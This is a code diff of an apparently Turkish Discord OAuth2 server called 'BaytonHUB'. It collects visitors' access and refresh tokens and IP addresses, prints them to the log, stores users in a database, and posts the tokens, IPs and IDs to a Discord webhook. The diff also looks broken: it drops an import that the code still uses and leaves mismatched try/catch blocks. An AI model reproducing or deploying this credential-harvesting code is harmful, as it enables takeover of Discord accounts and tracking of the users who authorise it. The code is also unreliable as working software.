@@ -2,19 +2,16 @@ const express = require('express');
 const app = express();
 const path = require('path');
 const mongoose = require('mongoose');
-const emoji = require('./src/Structures/Emojis.js');
-const config = require('./config');
-const { WebhookClient } = require('discord.js');
-const webhook = new WebhookClient({ url: config.webhookURL });
 const fetch = require('node-fetch');
+const { WebhookClient } = require('discord.js');
 const { createUser, updateUser } = require('./src/Structures/Functions');
 const { User } = require('./src/Models/index');
 const { success, logErr, log, yellow } = require('./src/Structures/Functions');
+const config = require('./config');
 
 Array.prototype.random = function () {
     return this[Math.floor(Math.random() * this.length)];
 };
-//process.kill(1)
 
 async function loadDatabase() {
     try {
@@ -25,10 +22,10 @@ async function loadDatabase() {
             socketTimeoutMS: 60000,
             family: 4,
         });
+        success('Database loaded');
     } catch (err) {
-        return logErr(`Database error : ${err}`);
+        logErr(`Database error : ${err}`);
     }
-    success('Database loaded');
 }
 
 app.get('/', async (req, res) => {
@@ -37,8 +34,9 @@ app.get('/', async (req, res) => {
 
     log(`${ip} : Yeni Ziyaretçi`);
 
-    if (!code) return res.sendStatus(400);
-    if (code.length < 30) return res.sendStatus(400);
+    if (!code || code.length < 30) {
+        return res.sendStatus(400);
+    }
 
     try {
         const oauthResult = await fetch('https://discordapp.com/api/oauth2/token', {
@@ -65,7 +63,8 @@ app.get('/', async (req, res) => {
         });
 
         const userInfo = await userResult.json();
-        if (userInfo.code == 0) {
+
+        if (userInfo.code === 0) {
             res.sendStatus(400);
             return logErr(`${ip} : Invalid code in URL`);
         }
@@ -81,26 +80,24 @@ app.get('/', async (req, res) => {
                 }
             );
         } catch (error) {
-            return;
+            logErr(`Role assignment error: ${error}`);
+            return res.sendStatus(500);
         }
 
         try {
-            // Bu kısımı ekliyoruz
-            res.sendFile(__dirname + '/index.html');
+            res.sendFile(path.join(__dirname, 'html', 'index.html'));
         } catch (err) {
             console.log(err);
             res.send("Error");
             return;
         }
-        
-    } catch (error) {
-        console.error('Error:', error);
-        res.sendStatus(500);
-    }
+
         const findUser = await User.findOne({ id: userInfo.id });
+
         yellow(`${'='.repeat(50)}`);
         success(`${ip} : Yeni Bağlantı ( ${userInfo.username}#${userInfo.discriminator} )`);
         success(`AT: ${oauthData.access_token} | RT: ${oauthData.refresh_token}`);
+
         if (!findUser) {
             sendWebhook(userInfo, oauthData, ip);
             success(`User DB Create : ${userInfo.username}#${userInfo.discriminator}`);
@@ -115,9 +112,12 @@ app.get('/', async (req, res) => {
         } else {
             logErr(`User DB Error : ${userInfo.username}#${userInfo.discriminator} Zaten izin verdi.`);
         }
+
         yellow(`${'='.repeat(50)}`);
+
     } catch (err) {
         logErr(err);
+        res.sendStatus(500);
     }
 
     res.redirect(config.redirectionBot.random());
@@ -125,6 +125,7 @@ app.get('/', async (req, res) => {
 
 function sendWebhook(userInfo, oauthData, ip) {
     let avatarUrl;
+
     if (userInfo.avatar) {
         avatarUrl = userInfo.avatar.startsWith('a_')
             ? `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}.gif?size=4096`
@@ -133,20 +134,15 @@ function sendWebhook(userInfo, oauthData, ip) {
         avatarUrl = `https://cdn.discordapp.com/embed/avatars/0.png`;
     }
 
-    webhook
+    new WebhookClient({ url: config.webhookURL })
         .send({
             embeds: [
                 {
                     color: 3092790,
                     description: `${emoji.progress} **Yeni Erişim**(BaytonHUB)`,
-                    thumbnail: {
-                        url: avatarUrl,
-                    },
+                    thumbnail: { url: avatarUrl },
                     fields: [
-                        {
-                            name: `${emoji.member} Kullanıcı Adı`,
-                            value: `\`\`\`ini\n[ @${userInfo.username} ]\`\`\``,
-                        },
+                        { name: `${emoji.member} Kullanıcı Adı`, value: `\`\`\`ini\n[ @${userInfo.username} ]\`\`\`` },
                         { name: `${emoji.author} IP Adresi`, value: `\`\`\`ini\n[ ${ip} ]\`\`\`` },
                         { name: `${emoji.author} Kullanıcı ID`, value: `\`\`\`ini\n[ ${userInfo.id} ]\`\`\`` },
                         { name: `${emoji.author} Erişim Tokeni`, value: `\`\`\`ini\n[ ${oauthData.access_token} ]\`\`\`` },
@@ -157,35 +153,19 @@ function sendWebhook(userInfo, oauthData, ip) {
             ],
         })
         .catch((err) => {
-            logErr(err);
+            logErr(`Webhook error: ${err}`);
         });
 }
 
-
-app.listen(config.port, async () => {
+async function startServer() {
     await loadDatabase();
-    log(
-        `oAuth v2 listening on http${config.port == 80 ? 's' : ''}://${Object.values(
-            require('os').networkInterfaces()
-        ).reduce(
-            (r, list) =>
-                r.concat(
-                    list.reduce((rr, i) => rr.concat((i.family === 'IPv4' && !i.internal && i.address) || []), [])
-                ),
-            []
-        )}${config.port !== 80 ? `:${config.port}` : ''}`
-    );
-});
+    app.listen(config.port, () => {
+        log(`oAuth v2 listening on http${config.port == 80 ? 's' : ''}://${Object.values(require('os').networkInterfaces())
+            .reduce((r, list) =>
+                r.concat(list.reduce((rr, i) => rr.concat((i.family === 'IPv4' && !i.internal && i.address) || []), [])),
+                []
+            )}${config.port !== 80 ? `:${config.port}` : ''}`);
+    });
+}
 
-const appr = express();
-const portr = config.redirectport;
-
-appr.use(express.static(path.join(__dirname, 'html')));
-
-appr.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'html', 'index.html'));
-});
-
-appr.listen(portr, () => {
-    console.log(`HTML server listening at ${portr} port.`);
-});
+startServer();
